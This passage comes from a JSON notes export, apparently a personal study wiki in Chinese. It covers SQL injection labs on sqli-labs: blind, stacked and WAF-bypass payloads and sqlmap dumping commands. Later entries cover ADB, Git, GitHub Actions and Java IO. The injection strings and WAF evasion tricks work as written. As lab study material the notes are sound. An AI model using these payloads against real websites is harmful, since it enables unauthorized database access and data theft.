条件不成立，执行c\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/3705cd9bfb4e4b10ae8a8f81712c8c09.png)的\n\n使用if与sleep结合使用：![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/c7279f60359d4778aa443db53705b252.png)\n\n达到延时数据显示，从而通过数据显示的时间判断数据对错!\n\n使用靶场less-2来实现延时注入：\n\nocalhost/sqli-labs-master/Less-2/index.php?id=1%20and%20sleep(if(database()=%27test%27,0,5))\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/c48403abd1ff4026a2a9485290321fa7.png)\n\n可以通过length（）来判断数据库的长度\n\nhttp://localhost/sqli-labs-master/Less-2/index.php?id=1%20and%20sleep(if(length(database())=8,8,0))\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/b1de1ad243a04e6d952ca86f0b394a90.png)\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/4f36b025da8041809ae05b5948ae6ec3.png)\n\nmid（）使用：\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/44847cfea0264c508384528490bf677e.png)\n\nsubstr()函数\nSubstr()和substring()函数实现的功能是一样的，均为截取字符串。\n\nstring substring(string, start, length)\nstring substr(string, start, length)\n参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。\n\nsubstr()函数使用：\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/f10a155fd6cf45a2a0d88159c51dc414.png)\n\nLeft()函数\n\nLeft()得到字符串左部指定个数的字符\n\nLeft ( string, n ) string为要截取的字符串，n为长度。\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/5fc2512b47444fd4a531725e7503a08f.png)\n\n通过以上函数可以来判断数据信息：\n\nhttp://localhost/sqli-labs-master/Less-2/index.php?id=1%20and%20sleep(if(mid(database(),1,1)=%27t%27,0,5))\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/8f63d5b742564ae18fda98666bc7df98.png)\n\n推荐使用ASCII码\n\n1.防止引号 ‘  “ 转义\n\n2.方便以后工具的使用\n\n使用ascii函数（）\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/6eea9e36b99d426184f938a0d29d5c85.png)\n\n结合场景使用：\n\nselect * from t1 where id=1 and if(ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=120,sleep(3),0);\n\nselect * from t1 where id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=116,sleep(2),0);","lastmodified":"2023-05-31T09:03:32.977907197Z","tags":null},"/4.4SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8":{"title":"4.4SQL注入之布尔盲注","content":"\n\n### 1.什么是布尔盲注？\n\nWeb的页面的仅仅会返回True和False。那么布尔盲注就是进行SQL注入之后然后根据页面返回的True或者是False来得到数据库中的相关信息。\n\n返回False时：\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646720755000/a9e2622c9ab4426eb95db68e9bc76ae2.png)\n\n返回True时：\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646720755000/61d6681f946648d39f5c46ce47d0285a.png)\n\n### 2.如何进行布尔盲注？\n\n注入流程：\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646720755000/65e35005c1d24fb085b94bf42339e5df.png)\n\n### 3.靶场案例演示：\n\n1.** 猜解数据库的名字**\n\n`http://127.0.0.1/sql/Less-5/index.php?id=1' and ascii(mid(database(),1,1))\u003e115--+ 非正常\n\nhttp://127.0.0.1/sql/Less-5/index.php?id=1' and ascii(mid(database(),1,1))\u003e116--+ 非正常\n\nhttp://127.0.0.1/sql/Less-5/index.php?id=1' and ascii(mid(database(),1,1))=115--+ 正常\nhttp://127.0.0.1/sql/less-5/index.php?id=1' and ascii(mid(database(),2,1))=101--+ 正常\nhttp://127.0.0.1/sql/less-5/index.php?id=1' and ascii(mid(database(),3,1))=99--+  正常`\n\n如此就得到了\n\n第一个字符的ASCII码为115解码出来为“s”\n\n第二个字符的ASCII码为101解码出来为“e”\n\n第二个字符的ASCII码为99解码出来为“c”\n\n依次类推出数据库的名字为“security”\n\n2.**猜解表明名**\n\n```\nhttp://127.0.0.1/sql/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=114--+ \n正确\nhttp://127.0.0.1/sql/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))=101--+ 正确\n```\n\n注：select下的limit是第几个表。\n\n　　substr下的是截取的表内容。\n\n当前库下（注入点连接的数据库）第一个表ASCII码为**114  解码为r**\n\n当前库下（注入点连接的数据库）第一个表ASCII码为**101  解码为e**\n\n**当前库下（注入点连接的数据库）第一个表ASCII码为....**  解码为** referer**\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646720755000/02a961e381134335aec168900f9974ad.png)\n\n### 总结归纳：\n\n盲注分为三种：\n\n**1.[布尔型盲注](http://www.cnblogs.com/xishaonian/p/6103505.html%20)：** 根据页面返回的真假来判断的即为**布尔型盲注**\n\n**2.[时间型盲注](http://www.cnblogs.com/xishaonian/p/6113965.html)：** 根据页面返回的时间来判断的即为**时间型盲注**\n\n**3.报错型盲注** ：根据页面返回的对错来判断的即为**报错型盲注**\n","lastmodified":"2023-05-31T09:03:32.977907197Z","tags":null},"/4.5SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%8A%A0%E8%A7%A3%E5%AF%86%E6%B3%A8%E5%85%A5":{"title":"4.5SQL注入之加解密注入","content":"\nBase64是网络上最常见的用于传输8Bit[字节码](https://baike.baidu.com/item/%E5%AD%97%E8%8A%82%E7%A0%81/9953683)的编码方式之一，Base64就是一种基于64个可打印字符来表示[二进制](https://baike.baidu.com/item/%E4%BA%8C%E8%BF%9B%E5%88%B6/361457)数据的方法。\n\nLess-21关 Cookie加密注入：\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646742005000/0afa9058e7b34fcf84a2e61b79189c91.png)\n\n通过Burpsuite抓包：\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646742005000/d02d59f88d1a483cbc362e968185ad67.png)\n\n进行Base64解密：\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646742005000/2bd5296c6df64f0782ded364586544d1.png)\n","lastmodified":"2023-05-31T09:03:32.977907197Z","tags":null},"/4.6SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5":{"title":"4.6SQL注入之堆叠注入","content":"\n# SQL注入之堆叠注入\n\n在SQL中，分号 ；是用来表示一条sql语句的结束，试想一下我们在 ； 结束一个sql语句后面继续构造下一个语句\n会不会一起执行？因此这个想法也就造就了堆叠注入。\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1647588038000/830dbff902c24ed4a6d9b250462658ed.png)\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1647588038000/5a9c5e81ccd64a0b904801ad549a6beb.png)\n\n而union injection（联合注入）也是将两条语句合并在一起\n两者之间有什么区别？区别就在于union执行语句类型有限，可以用来执行查询语句，而堆叠注入可以执行的是任意语句\n\nLess-38\n\nhttp://localhost/sqli-labs-master/Less-38/?id=1%27;insert%20into%20users(id,username,password)%20values%20(%2722%27,%27mc%27,%27hello%27)--+\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1647588038000/a69172f8e1d44093821b77231f9fc0bd.png)","lastmodified":"2023-05-31T09:03:32.977907197Z","tags":null},"/5.1SQL%E6%B3%A8%E5%85%A5%E4%B9%8BWAF%E7%BB%95%E8%BF%87":{"title":"5.1SQL注入之WAF绕过","content":"\n\n# SQL注入之WAF绕过\n- ### `WAF拦截原理：WAF从规则库中匹配敏感字符进行拦截。`\n  \n  ![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1647683310000/eaf7c52124254ea59a9cba144ae61b53.png){:height 573, :width 734}\n# 关键词大小写绕过\n\n```\n有的WAF因为规则设计的问题，只匹配纯大写或纯小写的字符，对字符大小写混写直接无视，这时，我们可以利用这一点来进行绕过\n\n举例： union select ---\u003e unIOn SeLEcT\n```\n# 编码绕过\n\n```\n针对WAF过滤的字符编码，如使用URL编码，Unicode编码，十六进制编码，Hex编码等.\n\n举例：union select 1,2,3# =union%0aselect 1\\u002c2,3%23\n```\n# 双写绕过\n\n```\n部分WAF只对字符串识别一次，删除敏感字段并拼接剩余语句，这时，我们可以通过双写来进行绕过。\n\n举例：UNIunionON ，SELselectECT anandd\n```\n# 换行(\\N)绕过\n\n```\n举例：select * from admin where username = \\N union select 1,user() from admin\n```\n# 注释符内联注释绕过：\n\n```\n\n\nunion selecte =/*!union*/ select\n\n注释符里感叹号后面的内容会被mysql执行。\n```\n# 同义词替换\n\n```\nand=\u0026\u0026\n\nor=||\n\n=(等于号)=\u003c、\u003e\n\n空格不能使用=%09,%0a,%0b,%0c,%0d,%20,%a0等\n\n注：%0a是换行也可以替代空格\n```\n# HTTP参污染\n\n```\n对目标发送多个参数，如果目标没有多参数进行多次过滤，那么WAF对多个参数只会识别其中的一个。\n\n举例：?id=1\u0026id=2\u0026id=3\n?id=1/**\u0026id=-1%20union%20select%201,2,3%23*/\n```\n### `WAF绕过的思路就是让WAF的检测规则，识别不到你所输入的敏感字符，利用上述所介绍的知识点，灵活结合各种方法，从而可以增加绕过WAF的可能性`\n\n```\norder by绕过：%20/*//--/*/  V4.0\n联合绕过：union /*!--+/*%0aselect/*!1,2,3*/ --+\nfrom绕过： /*!06447%23%0afrom*/\n\n```","lastmodified":"2023-05-31T09:03:32.977907197Z","tags":null},"/6.1SQL%E6%B3%A8%E5%85%A5%E4%B9%8Bsqlmap%E4%BD%BF%E7%94%A8-get%E5%9E%8B%E6%B3%A8%E5%85%A5":{"title":"6.1SQL注入之sqlmap使用-get型注入","content":"\n\n# SQL注入之sqlmap使用(get型注入)\n\n#### 一、SQLMap介绍\n\n##### 1、Sqlmap简介：\n\nSqlmap是一个开源的渗透测试工具，可以用来自动化的检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。\n\n目前支持的数据库有MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access等大多数据库。\n\n##### 2、Sqlmap支持的注入方式：\n\nSqlmap全面支持六种SQL注入技术：\n\n* 基于布尔类型的盲注：即可以根据返回页面判断条件真假的注入。\n* 基于时间的盲注：即不能根据页面返回的内容判断任何信息，要用条件语句查看时间延迟语句是否已执行(即页面返回时间是否增加)来判断。\n* 基于报错注入：即页面会返回错误信息，或者把注入的语句的结果直接返回到页面中。\n* 联合查询注入：在可以使用Union的情况下的注入。\n* 堆查询注入：可以同时执行多条语句时的注入。\n* 带外注入：构造SQL语句，这些语句在呈现给数据库时会触发数据库系统创建与攻击者控制的外部服务器的连接。以这种方式，攻击者可以收集数据或可能控制数据库的行为。\n\n#### 二、SQLMap使用：\n\n##### 1、判断是否存在注入：\n\n假设目标注入点是 `http://127.0.0.1/sqli-labs/Less-1/?id=1`，判断其是否存在注入的命令如下：\n\n```\nsqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1\n\n```\n\n当注入点后面的参数大于等于两个时,需要加双引号，如下所示。\n\n```\nsqlmap.py -u \"http://127.0.0.1/sqli-labs/Less-1/?id=1\u0026uid=2\"\n\n```\n\n运行完判断是否存在注入的语句后，爆出一大段代码，这里有三处需要选择的地方：第一处的意思为检测到数据库可能是MySQL，是否需要跳过检测其他数据库；第二处的意思是在“level1、risk1”的情况下，是否使用MySQL对应的所有Payload进行检测；第三处的意思是参数 `id`存在漏洞，是否要继续检测其他参数，一般默认按回车键即可。\n\n常用命令：\n\n```\n\n-u:用于get提交方式，后面跟注入的url网址\n--level\n--risk\n\n--dbs：获取所有数据库\n--tales：获取所有数据表\n--columns：获取所有字段\n--dump：打印数据\n\n-D：查询选择某个库\n-T：查询选择某个表\n-C：查询选择某个字段\nlevel：执行测试的等级（1~5，默认为1），使用-level参数并且数值\u003e=2的时候会检查cookie里面的参数，\n\t当\u003e=3时检查user-agent和refereer\n          risk：执行测试的风险（0~3,默认为1），默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，\n\t3会增加or语句的sql注入\n```\n","lastmodified":"2023-05-31T09:03:32.977907197Z","tags":null},"/6.2SQL%E6%B3%A8%E5%85%A5%E4%B9%8Bsqlmap%E4%BD%BF%E7%94%A8-post%E6%B3%A8%E5%85%A5":{"title":"6.2SQL注入之sqlmap使用-post注入","content":"\n\n# SQL注入之sqlmap使用(post注入)\n\nPOST型：与数据库交互是通过post数据进行，URL不可见\n### 利用sqlmap进行POST注入，常见的有三种方法:\n- ## 注入方式一：\n  \n  **1.用Burp抓包，然后保存抓取到的内容。例如：保存为1.txt,然后把它放至某个目录下**\n  \n  ![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1651663711000/4acf54c747204860a73fe74a42a8c8c2.png){:height 479, :width 734}\n  \n  **2.列数据库:**\n  \n  sqlmap.py -r C:\\Users\\ZQ\\Desktop\\1.txt -p uname --dbs\n  \n  也可以使用  *  指定需要测试的参数\n  \n  **it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]**\n  它看起来像后端DBMS是'MySQL'。 是否要跳过特定于其他DBMS的测试负载？ [Y/n]  输入\"Y\"\n  \n  **for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]**\n  对于剩余的测试，您想要包括所有针对“MySQL”扩展提供的级别（1）和风险（1）值的测试吗？ [Y/n] 输入\"N\"\n  \n  **POST parameter 'n' is vulnerable. Do you want to keep testing the others (if any)? [y/N]**\n  POST参数'n'是脆弱的。 你想继续测试其他人（如果有的话）吗？[y/N]  输入\"Y\"\n### 3.猜表\n\n选择一个数据库，比如选test\n\nsqlmap.py -r C:\\Users\\ZQ\\Desktop\\1.txt -p uname -D test --tables\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1651663711000/583ad73419114e1ea19656c1102841d1.png)\n\n**4.猜列**\n\nsqlmap.py -r C:\\Users\\ZQ\\Desktop\\1.txt -p uname -D test  -T t1 --columns\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1651663711000/f96cf3e6a13d4e90a7e3a051bf3fe64f.png)\n## 注入方式二：自动搜索表单的方式\n\nsqlmap.py  -u \"http://localhost/sqli-labs-master/Less-11/index.php\" --forms\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1651663711000/d1b1a089b2824e80a36551e501cfbe64.png)\n\ndo you want to test this form? [Y/n/q]\n要测试此表单吗?[Y/n/q]  输入\"Y\"\n\ndo you want to fill blank fields with random values? [Y/n]\n是否要填充带有随机值的空白字段? [Y/n]  输入\"Y\"\n\nit looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]\n它看起来像后端DBMS是'MySQL'。 是否要跳过特定于其他DBMS的测试负载？ [Y/n] 输入\"Y\"\n\nfor the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]\n对于剩余的测试，您想要包括所有针对“MySQL”扩展提供的级别（1）和风险（1）值的测试吗？[Y/n]  输入\"N\"\n\nPOST parameter 'n' is vulnerable. Do you want to keep testing the others (if any)? [y/N]\nPOST参数'n'是脆弱的。 你想继续测试其他人（如果有的话）吗？[y/N]  输入\"N\"\n\ndo you want to exploit this SQL injection? [Y/n]\n你想利用SQL注入？ 输入\"Y\"\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1651663711000/490d416ed490474db5c6b8d6adcca84e.png)\n\n常用命令：\n\n```\n-r表示加载一个文件，-p指定参数\n--current-db 当前数据库\n--forms 自动检测表单\n-data   \n```","lastmodified":"2023-05-31T09:03:32.977907197Z","tags":null},"/ADB%E5%91%BD%E4%BB%A4":{"title":"ADB命令","content":"# ADB命令\n\n\n## 线刷相关\n```bash\nadb version #查看adb版本\nadb devices #查看连接的手机\nadb sideload file.zip #刷zip包到手机\n\nadb reboot #重启\nadb reboot fastboot #重启到fastboot\nadb reboot bootloader #重启到bootloader界面\n\n```\n\nfast模式下\n\n```bash\nfastboot oem reboot-recovery #打开recovery\nfastboot flash recovery twrp.img #安装rec文件\n```\n\n## 卸载软件相关\n### 普通卸载\n\n```shell\n//所有软件的包名\nadb shell pm list packages\n\n//卸载命令\nadb uninstall 包名  #或者\nadb shell pm uninstall --user 0 包名\n\n```\n\n### 删除的系统软件的另一种方式\n```shell\nadb root。   #在终端输入该命令获得root权限。\nadb remount。  #重新挂载，获得对读写权限。\nadb shell。   #进入adb命令环境。\ncd /ystem/app #system/app目录，一般系统apk都安装在这个目录。\nrm -rf Browser.apk   #卸载那个文件，没有尝试过  \n```\n\n### 另一种离谱的方式\n并不会删除软件，但是会导致安装上的软件所有数据全部删除，0b的无数据软件\n使其**无法正常工作，无法工作**\n```shell\nadb shell #进入shell命令\ncd /system/     #这里记不得目录了，好像是sdcard目录\ncd Android/data/\nrm -rf 包名\n```\n\n\nFailure [DELETE_FAILED_INTERNAL_ERROR]之后rm apk卸载\n\n```bash\nadb shell pm list packages -s 找到要删除的包名\n\n//获取包名地址\nC:\\\\Users\\\\ShenWeiXing\u003eadb shell pm path com.xxx.xxx\npackage:/data/app/包名/base.apk\n\n//挂载系统读写权限\nC:\\\\Users\\\\ShenWeiXing\u003eadb remount\nremount succeeded\n\n//删除包\nC:\\\\Users\\\\ShenWeiXing\u003eadb shell rm /data/app/com.xxx.xxx-1/base.apk\n\n//重启后ok\nC:\\\\Users\\\\ShenWeiXing\u003eadb reboot\n\n```\n\n## 停用软件\n```shell\nadb shell pm disable-user com.duokan.reader\n```","lastmodified":"2023-05-31T09:03:32.977907197Z","tags":null},"/Git":{"title":"Git","content":"\n- [常用命令大全](https://www.runoob.com/note/56524)\n- 学习set\n\t- [[git-远程仓库一般流程]]\n\t- [[git-安装之后的配置]]\n\t- [[git-查看配置信息]]\n\t- [[git-更新内容一般流程]]\n\t- [[git-查看历史版本]]\n\t- [[git-代码合并的不同方式]]\n\t- [[git-克隆仓库]]\n- 基本使用\n\t- [[Git的基本使用]]\n- 其他\n\t- [[将.git文件夹与仓库分开]]\n- git action（github action）\n\t- [[使用Github action复制分支文件到同仓库的另一个分支]]\n\t- [[Github Action同步某个文件夹到另一个分支]]\n\t- [[git子模块 submodule]]\n\t- [[Github：配置令牌Token]]","lastmodified":"2023-05-31T09:03:32.977907197Z","tags":null},"/Git%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8":{"title":"Git的基本使用","content":"\n# Git的基本使用\n\n\n### 设置代理\n\n```bash\ngit config --global http.proxy http://127.0.0.1:7890\n```\n\n## 提交三部曲\n```bash\ngit add .\ngit commit -m \"提交内容\"\ngit push #提交到远程仓库中\n```\n## git配置方面\n\n```bash\ngit config --global http.proxy \u003chttp://127.0.0.1:7890\u003e  #设置代理\n\n#设置邮箱和用户名\ngit config --global user.email \"fa@fds.com\"   \ngit config --global user.name \"fa\"\n\ngit config --list  #查看配置列表\n```\n\n```bash\necho \"# hanguang\" \u003e\u003e README.md\ngit init\t\t\t\t#初始化仓库\ngit add README.md\t\t #新建标注文件，可以不要\ngit commit -m \"first commit\"\t#“提交信息”\ngit branch -M main\t\t\t\t#设置默认分支\ngit remote add origin \u003chttps://github.com/tianzhongs/hanguang.git\u003e\t#添加远程分支到本地命名为origin\ngit push -u origin main\t#推送origin到默认分支main\n```\n\n\n## 分支方面\n\n```bash\ngit branch -m main hugo \ngit fetch origin\ngit branch -u origin/hugo hugo\ngit remote set-head origin -a\n```\n\n## 子模块方面\n### 删除子模块\n第一种：\n```bash\ngit rm 子模块名称\n```\n第二种：\n```bash\nrm -rf 子模块目录 #删除子模块目录及源码 bash下使用 \nvi .gitmodules #删除项目目录下.gitmodules文件中子模块相关条目 \nvi .git/config #删除配置项中子模块相关条目 \nrm .git/module/* #删除模块下的子模块目录，每个子模块对应一个目录，注意只删除对应的子模块目录即可\n```\n\n### 添加子模块\n```bash\ngit submodule add url链接 作为父类文件夹的名称 #其中文件夹为可选，默认是子类仓库名称\n```\n\n### 子模块更新\n```\ngit submodule update --init #初始化\ngit submodule update --remote #同步子模块最新版本仓库到父仓库中\n```","lastmodified":"2023-05-31T09:03:32.977907197Z","tags":null},"/Github%E9%85%8D%E7%BD%AE%E4%BB%A4%E7%89%8CToken":{"title":"Github：配置令牌Token","content":"\n\n# Github：配置令牌Token\n\nCreated time: January 11, 2023 4:06 AM\nStatus: Yes\nTags: https://www.notion.so/Github_Token-fcf6ab8387414ceb842e76e704921f2a, https://www.notion.so/posts-864feac8235f4311baf1750669ec1c7f\nd : 2023-01-11\n- # 创建 Token\n  \n  1. 打开账户设置\n  ![image.png](../../assets/image_1683517480701_0.png) \n  \n  2. 打开 [https://github.com/settings/tokens](https://github.com/settings/tokens) (开发者设置里的 ToKen )\n  \n  3. 创建一个令牌即可，创建的时候需要注意时间以及权限，名称可以设置为作用（这个 token 你用来干嘛）\n  \n  ![image.png](../../assets/image_1683517518768_0.png)\n- # 使用\n- 一般是在仓库的 `action` 或者**账户登录或者授权**时进行使用。\n- 提一下仓库 action 使用：\n  ![image.png](../../assets/image_1683517555200_0.png)\n- 注意：**设置的名称是你的 action 文件中的变量名称**，比如工作流 action 的变量如下\n  ```\n  TOKEN: ${{ secrets.ACTIONS }}\n  ```\n  \n  那么添加的名称就应该是 `ACTIONS`，也就是 `secrets.` 后面的那个单词","lastmodified":"2023-05-31T09:03:32.977907197Z","tags":null},"/Github-Action%E5%90%8C%E6%AD%A5%E6%9F%90%E4%B8%AA%E6%96%87%E4%BB%B6%E5%A4%B9%E5%88%B0%E5%8F%A6%E4%B8%80%E4%B8%AA%E5%88%86%E6%94%AF":{"title":"Github Action同步某个文件夹到另一个分支","content":"\n- # 作用\n  \n  \u003e Github Action 是 github 官方的一种工作流，可以理解为一种自动化脚本，常用于 githubPage 的部署，可以用来在 git 仓库 push 时自动完成一些动作。\n- # 使用\n  \n  创建工作流 yml 文件，action 文件的创建，可以参考官方文档 [GitHubActions文档 - GitHub Docs](https://docs.github.com/zh/actions)\n  \n  ```\n  name: File Sync\n  \n  on:\n  push:\n    branches:\n  # 当以下分支push时会启动工作流- master\n  schedule:\n    - cron: 0 0 * * *\n  \n  jobs:\n  file_sync:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Fetching Local Repository\n        uses: actions/checkout@master\n      - name: File Sync\n        uses: kbrashears5/github-action-file-sync@v2.0.0\n        with:\n          REPOSITORIES: |\n          # 克隆文件到以下分支\n            username/repo@master\n          FILES: |\n          # 同步的文件\n            sync/dependabot.yml=.github/dependabot.yml\n          TOKEN: ${{ secrets.ACTIONS }}\n  ```\n  \n  配置项说明\n- branches：需要启动的分支，需要配置\n- rep：克隆的仓库，需要配置 `username/repo@master`，参数分别是 `用户名/仓库名称@克隆到的分支名称`\n- TOKEN：必须配置，具体参考我的文章《 [[Github：配置令牌Token]] 》\n- FILES ：`需要克隆的文件或者文件夹=克隆到仓库的目录`\n\t- 比如克隆文件夹 `post` 到另一个分支的 `发布` 文件夹，那么就是 `post/=发布/`\n\t- 也就是**建议文件夹后面跟上斜杠 `/` 符号**\n# 用例：\n\n我使用的原因是因为:\n\nObsidian（笔记软件中的文章，作为博客发布到 hexo 博客上，但是因为 hexo 每次同步都会同步一些配置文件和主题文件，因为我的手机端也在通过`webdav`进行同步，所以手机上也要同步配置文件（配置文件一般会很多，因为还有主题之类的文件）\n\n采用这种方式，可以将主分支作为笔记仓库，然后将笔记仓库中需要发布的文章，利用这个工作流同步到另一个发布分支的文件夹中，这样的话也可以更好地专注于内容本身。\n-","lastmodified":"2023-05-31T09:03:32.977907197Z","tags":null},"/IO%E6%B5%81":{"title":"IO流","content":"# IO流\n# IO流\n\nCreated: August 1, 2022 8:50 AM\n类别: IO\n\n包：`java.io`\n\n# 书写注意点\n\n1. 创建流对象的时候异常：\n    1. 写入对象会有`IOException`需要捕获，因为你输出输出数据了\n    2. 读取对象会有`FileNotFoundException` 需要捕获，因为你读取文件路径要找文件\n    3. 流关闭的时候会有`IOException`，同理，你要找文件把它关闭了\n2. 先创建的流对象要赋值`null`，放在`try`外面，`try`里面在对文件路径进行赋值，避免在`finally`关闭的时候找不到变量\n3. `output`**操作一定要记得`flush`**\n4. Stream结尾的是**字节流**，什么文件都可以操作；但是writer和reader结尾的是**字符流**，专用对普通文本操作，可以[直接进行String的写出](IO流.md)\n\n# 流的分类\n\n1. 流的方向：输入流、输出流\n2. 读取数据的方式：字节流、字符流\n\n## IO四大家族\n\n1. `java.io.InputStream` 字符输入流\n2. `java.io.OutputStream` 字符输出流\n3. `java.io.reader` 字符输入流\n4. `java.io.writer` 字符输出流\n\n# 四大家族：需要掌握的流\n\n以下的读取就是输入，写出就是输出。\n\n**前两个是最常用的**\n\n```java\n//文件专属\njava.io.FileInputStream//读取字节流\njava.io.FileOutputStream//写出字节流\njava.io.FileReader//读取字符流\njava.io.FileWriter//写出字符流\n//转换流 字节流--\u003e字符流\njava.io.InputStreamReader//字节流--》字符流\njava.io.OutputStreamWriter//字节流--》字符流\n//缓冲专属 带有缓冲区\njava.io.BufferedInputStream //字节流，读取\njava.io.BufferedOutputStream//字节流，写入\njava.io.BufferedReader//字符包装流，传入FileReader，读取\njava.io.BufferedWriter//字符写入流，传入FileWriter，写入\n//数据流专属\njava.io.DataInputStream\njava.io.DataOutputStream\n//对象专属流  通常用于序列化\njava.io.ObjectInputStream\njava.io.ObjectOutputStream\n//标准输出流\njava.io.PrintStream\njava.io.PrintWriter\n```\n\n## 注意\n\n1. 类名以`Stream`结尾的是字节流，以`reader/writer`结尾的是字符流\n2. 所有的流都有`close()`关闭，用完之后要关闭，避免浪费资源\n3. 所有的**输出流**都有`flush()`方法，所有的***输出流用完之后要记得刷新*。**刷新表示将管道中的剩余未输出数据强行输出完，作用就是**清空管道   写操作必须要`flush`**\n    1. 缓冲区太大，输出流，输出流就可能偷懒，没有写入，使用flush就会强制把没有填满缓冲区的部分全部输出\n\n## FileInputStram\n\n### 第一种，一个字节一个字节的读\n\n```java\nimport java.io.FileInputStream;\nimport java.io.FileNotFoundException;\nimport java.io.IOException;\n\npublic class FileInputStreamTest01 {\n    public static void main(String[] args) {\n//创建字节流对象\nFileInputStream fis=null;\n        try {\n            fis=new FileInputStream(\"E:\\\\javaAdvanced\\\\ioTest\\\\src\\\\tmp\");//引入文件，可能有文件未找到的异常需要考虑\nint readData=0;\n//读取文件，可能会有io异常\nwhile((readData=fis.read())!=-1){\n\n                System.out.println(readData);\n            }\n\n        }catch (FileNotFoundException e){\n            e.printStackTrace();\n        }catch (IOException e){\n            e.printStackTrace();\n        }finally {\n            if (fis!=null) {\n                try {\n                    fis.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n}\n\n```\n\n![Untitled](../../../../assets/Untitled%2023.png)\n\n效率低\n\n### (重点)第二种，传入一个数组去读取\n\n```java\nimport java.io.FileInputStream;\nimport java.io.FileNotFoundException;\nimport java.io.IOException;\n\npublic class FileInputStramTest03{\n    public static void main(String[] args) {\n    //    创建一个字节流对象\n        FileInputStream fis=null;\n        try {\n            fis=new FileInputStream(\"ioTest/src/gushi\");//有个FileNotFountException异常需要捕获\n        //    创建一个字节数组，每次读取4个\n            byte[] bytes=new byte[4];\n            int readCount=0;//每次读取的数量\n            while ((readCount= fis.read(bytes))!=-1){//read有IOException需要捕获\n                //String可以将数组转换成字符，String（数组，起始值，需要多少个）\n                System.out.print(new String(bytes,0,readCount));\n            }\n        } catch (FileNotFoundException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n![Untitled](../../../../assets/Untitled%201%204.png)\n\n## FileOutputStream\n\n```java\nimport java.io.FileNotFoundException;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class FileOutputStreamTest01 {\n    public static void main(String[] args) {\n        FileOutputStream fis=null;\n        try {\n//FileOutputStream fis=new FileOutputStream(\"ioTest/src/写入.txt\",true);//追加的方式写入\nfis=new FileOutputStream(\"ioTest/src/写入.txt\");//覆盖的方式写入\nbyte[] bytes={97,98,99,100};\n            fis.write(bytes);//第一种，写入一个数组\nfis.write(98);//写入一个字节\nfis.write(bytes,0,3);//写入数组的一部分\nfis.flush();\n            String s=\"我是你爸爸\";\n            fis.write(s.getBytes());//字符转换成数组写入\n\nfis.flush();//之后必做的一部分，刷新\n\n} catch (FileNotFoundException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }finally {\n            if 